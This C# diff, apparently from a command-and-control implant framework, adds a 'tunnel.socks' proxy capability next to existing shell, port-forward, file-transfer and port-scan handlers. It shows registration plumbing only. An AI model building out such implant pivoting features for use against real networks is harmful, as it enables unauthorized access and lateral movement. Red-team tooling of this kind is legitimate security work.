@@ -191,6 +191,8 @@ internal sealed class HandlerRegistry
                 (TaskOutcome.Failed, "shell.interact runs as a live channel; this dispatch path does not carry one")),
             new CapabilityHandler("tunnel.forward", _ =>
                 (TaskOutcome.Failed, "tunnel.forward runs as a live channel; this dispatch path does not carry one")),
+            new CapabilityHandler("tunnel.socks", _ =>
+                (TaskOutcome.Failed, "tunnel.socks runs as a live channel; this dispatch path does not carry one")),
             new CapabilityHandler("file.push", args => Files.Push(args)),
             new CapabilityHandler("file.pull", args => Files.Pull(args)),
             new CapabilityHandler("recon.portscan", args => Core.PortScan(args)),
@@ -219,12 +221,14 @@ internal sealed class HandlerRegistry
 
         // The channel registrations (architecture.md Sec 10.3, the streaming
         // task shape): shell.interact is shell.exec's live-channel shape, and
-        // tunnel.forward bridges the channel to a TCP connection of the
-        // implant's own (architecture.md Sec 5.2, Sec 14).
+        // the tunnel verbs bridge the channel to TCP connections of the
+        // implant's own -- tunnel.forward one connection, tunnel.socks the
+        // connection-multiplexed proxy (architecture.md Sec 5.2, Sec 14).
         var channels = new List<CapabilityChannelHandler>
         {
             new("shell.interact", (args, stream, ct) => InteractiveShell.RunAsync(args, stream, ct)),
             new("tunnel.forward", (args, stream, ct) => TunnelForward.RunAsync(args, stream, ct)),
+            new("tunnel.socks", (args, stream, ct) => TunnelSocks.RunAsync(args, stream, ct)),
         };
         return new HandlerRegistry(handlers, staged, channels);
     }
